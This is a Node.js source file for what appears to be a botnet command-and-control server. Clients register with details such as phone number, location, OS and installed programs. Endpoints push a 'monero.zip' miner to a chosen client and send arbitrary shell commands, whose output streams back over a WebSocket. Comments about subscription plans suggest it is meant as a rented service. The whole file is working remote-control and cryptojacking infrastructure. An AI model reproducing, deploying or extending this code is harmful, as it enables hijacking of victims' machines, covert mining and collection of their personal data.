const net = require("node:net");
const express = require("express");
const uuid = require("uuid");
const { encode } = require("node:punycode");
const { randomInt } = require("node:crypto");
const app = express();
const http = require("http");
const fs = require("fs");
const WebSocket = require("ws");
const serverWebSocket = new WebSocket.Server({ port: 1300 });
const bluebird = require("bluebird");

function removeDuplicate(string, deplecated) {
  const set = string.split(deplecated);
  return set.join("");
}

bluebird.config({ cancellation: true }); // <-- enables this non-standard feature

let webSocket = null;
serverWebSocket.on("connection", (socket) => {
  console.log("new websocket client.");
  webSocket = socket;
});

app.listen(8080);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header(
    "Access-Control-Allow-Headers",
    "Origin, X-Requested-With, Content-Type, Accept"
  );
  next();
});

const clients = {};

app.get("/api/s/clients", (req, res) => {
  console.log("request get clients id >");
  // if (req.ip == "::1") {

  console.log(Object.keys(clients));
  return res.send(Object.keys(clients));
  // } else {
  // 	res.status(500).send("")

  // }
});

const server = net.createServer((socket) => {
  let dataListner = null;

  socket.once("data", (dataString) => {
    let data = JSON.parse(dataString);
    // console.log(data)

    if (!data["id"]) {
      return;
    }

    const clientIdentifier = data["id"].toString().trim().slice(0, 36);
    console.log("New Client");

    // ! register clients :
    /* 
			data: {
				id,
				createdAt, 
				workTimeinHour,
				startAt,
				userId,
				userPhoneNumber,
				location,
				oparationSystem,
				isOnline
				installed programs


			} 

			log: {
				startAt:
				workTime
				tasks: 
				
			}


			*/

    console.log(clientIdentifier);

    if (uuid.validate(clientIdentifier)) {
      clients[clientIdentifier] = { socket, ...data };
      console.log(clients[clientIdentifier]);
      // ws.send(clients.keys.length)

      app.post("/install", async (req, res) => {
        const tool = req.query.tool;
        const id = req.query.id;
        // console.log(clients[id])
        if (clients[id] == null) {
          // console.log()
          return res.status(400).send("Client not found");
        }
        if (clients[id].installed_tools.includes(tool)) {
          return res.send("installed");
        }

        let zipFilePath = "tools/monero.zip";

        fs.readFile(zipFilePath, (err, zipData) => {
          if (err) {
            console.error("Error reading ZIP file:", err);
            return res.status(500).send("Error reading ZIP file");
          }
          clients[id]["socket"].write(`INSTALL_MONERO:`);

          clients[id]["socket"].write(zipData, () => {
            clients[id]["socket"].write(`END_MONERO;s#1&`);
            res.send("installed");
          });
        });
      });

      app.get("/stream_command", async (req, res) => {
        // ! check user subscription plan

        const command = req.query.command;

        // ! choose clients

        const id = req.query.id;
        console.log(command.toString());
        clients[id]["socket"].write(command.toString());
        let bufferList = [];

        const promise1 = new bluebird.Promise((resolve, reject) => {
         clients[id]["socket"].on("data", (data) => {
            try {
              if (data.toString().trim() == "sTop#0&") {
				console.log("cancel promise 1")	
				clients[id]["socket"].removeAllListeners('data')
                promise1.cancel();
				return;
              }

              // ! send command otput to user
              let commandOutput = removeDuplicate(
                data.toString().trim(),
                "s#1&"
              ); // Convert received data to a string and remove leading/trailing whitespace
              // if (commandOutput.toString().search("s#1&") > 0) {
              // 	commandOutput = commandOutput.split("s#1&")[0]
              // }
              // bufferList.push(commandOutput)
              return webSocket.send(commandOutput);
              // if (commandOutput.toString().search("s#1&") > 0) {

              // }
            } catch (err) {
              console.log(err);
              
            }

          });
        });

        bluebird.Promise.all([promise1]).then((v) => {
          console.log(`finished -> ${v}`);
        });
      });

      app.get("/command", async (req, res) => {
        // ! check user subscription plan

        const command = req.query.command;

        // ! choose clients

        const id = req.query.id;
        console.log(command.toString());
        clients[id]["socket"].write(command.toString());
        let bufferList = [];
        clients[id]["socket"].on("data", (data) => {
          try {
            // ! send command otput to user
            let commandOutput = data.toString().trim(); // Convert received data to a string and remove leading/trailing whitespace
            if (commandOutput.toString().search("s#1&") > 0) {
              commandOutput = commandOutput.split("s#1&")[0];
            }
            bufferList.push(commandOutput);
            if (commandOutput.toString().search("s#1&") > 0) {
              res.send(bufferList.join(""));
            }
          } catch (err) {
            console.log(err);
          }
        });
      });

      // ! remove clients which lose connection
      socket.on("end", () => {
        console.log(`Client ${clientIdentifier} disconnected.`);
        delete clients[clientIdentifier]; // Remove the client from the tracking object
      });

      socket.on("error", (error) => {
        console.error(`Socket error for ${clientIdentifier}:`, error);
        delete clients[clientIdentifier]; // Remove the client from the tracking object

        socket.destroy();
      });
    }
  });

  socket.on("error", (error) => {
    console.error("Socket error:", error);
    socket.destroy();
  });
});

const PORT = 27015; // Change this to the port you want to listen on
server.listen(PORT, () => {
  console.log(`Node.js server listening on port ${PORT}`);
});

server.on("error", (error) => {
  console.error("Server error:", error);
});
